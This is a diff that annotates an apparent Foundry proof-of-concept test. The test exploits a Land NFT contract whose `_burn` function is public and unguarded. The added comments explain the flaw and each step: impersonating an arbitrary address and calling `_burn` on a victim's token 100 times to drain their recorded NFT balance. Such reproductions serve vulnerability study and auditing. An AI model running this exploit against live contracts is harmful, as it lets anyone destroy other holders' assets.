@@ -15,12 +15,17 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        // @VULNERABILITY: `_burn(address from, address owner, uint256 id)` in sources/Land_50f547/src_Land_erc721_ERC721BaseToken.sol:355 is `public` (not `internal`) and performs only `require(from == owner)` with no `msg.sender` authorization, `ownerOf` check, or approval validation — unlike the gated `burn`/`burnFrom` entrypoints — allowing any caller to destroy arbitrary holders' NFTs and underflow their _numNFTPerAddress count.
+        // @EXPLOIT_STEP 1: Impersonate an arbitrary address (no roles, no approvals) via cheatcode startPrank — proves the defect requires zero privileges.
         cheats.startPrank(0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C);
         console.log("Before exploiting, victim owned NFT:", Land._numNFTPerAddress(victim)); // 2762 is the number of NFTs in the victim's account.
         for (uint256 i = 0; i < 100; i++) {
             // let's try to burn 100 nfts
+            // @EXPLOIT_STEP 2: Invoke the unprotected public _burn helper directly, supplying victim for both `from` and `owner` (satisfies the trivial require) and a chosen token id; contract blindly emits Transfer(to zero) and decrements victim's balance counter.
             Land._burn(victim, victim, 3738); // _burn function that was set to be called was set in a public state, anyone can burn any user's NFT.
+            // @EXPLOIT_STEP 3: Repeat the call (here 100× on same id) — each iteration succeeds because _burn lacks ownership-state guard and decrements unconditionally, draining the victim's recorded NFT count.
         }
         console.log("After exploiting, victim owned NFT:", Land._numNFTPerAddress(victim));
+        // @EXPLOIT_STEP 4: Victim permanently loses the NFTs (balance reduced, tokens marked burned) with no on-chain recovery path; attacker paid only gas.
     }
 }
